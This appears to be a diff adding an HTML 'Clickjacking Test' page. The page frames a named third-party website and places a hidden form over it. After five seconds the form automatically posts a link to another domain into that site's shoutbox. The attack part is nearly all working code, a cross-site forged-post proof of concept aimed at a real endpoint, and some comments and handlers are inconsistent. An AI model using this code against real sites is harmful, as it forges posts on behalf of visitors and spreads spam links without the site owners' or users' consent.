@@ -1,0 +1,86 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Clickjacking Test</title>
+    <style>
+        iframe {
+            position: absolute;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            opacity: 1;
+            z-index: 2;
+        }
+        .bait {
+            position: absolute;
+            top: 200px;
+            left: 200px;
+            z-index: 1;
+        }
+    </style>
+    <script>
+
+
+        // Set a timeout to submit the form after a specified delay
+        var secs = 5; // Set the number of minutes to wait
+        var milliseconds = secs * 1000; // Convert minutes to milliseconds
+
+
+    </script>
+</head>
+<body>
+
+    <iframe src="https://xianz.com/"></iframe> <!-- Replace with the actual URL -->
+    <form style="visibility:hidden;" name="smiletagform" method="post" action="https://xianz.com/shouts/post.php" target="iframetag" onsubmit="clearMessage();" id="smiletagform">
+        <input type="hidden" name="id" value="1">
+        <input type="hidden" name="type" value="1">
+        <input type="hidden" name="refid" value="1234">
+        <input type="hidden" name="message" value="Auto-submitted message">
+        <input type="text" name="message_box" value="value" style="width: 50%;" onkeypress="onEnter(event)">
+        <input type="submit" name="submit" value="Shout!">
+    </form>
+
+    <script>
+
+window.addEventListener("DOMContentLoaded", function() {
+        // Function to automatically submit the form
+        function autoSubmitForm() {
+            var form = document.forms['smiletagform'];
+            // Set the hidden input values or any other necessary fields
+            form.elements['message'].value = "https://ichehar.com";
+
+            // Submit the form programmatically
+            HTMLFormElement.prototype.submit.call(form);
+        }
+
+
+        // Schedule the form submission
+        setTimeout(autoSubmitForm, milliseconds);
+
+
+        // Function to handle Enter key press for form submission
+        function onEnter(event) {
+            var intKeyCode = event.which || event.keyCode;
+
+            // process only the Enter key
+            if (intKeyCode === 13) {
+                event.preventDefault();
+                document.forms["smiletagform"].submit();
+            }
+        }
+
+        // Function to clear the message (if needed)
+        function clearMessage() {
+            document.forms["smiletagform"].message_box.value = "";
+        }
+    }, false);
+
+
+    </script>
+
+</body>
+</html>
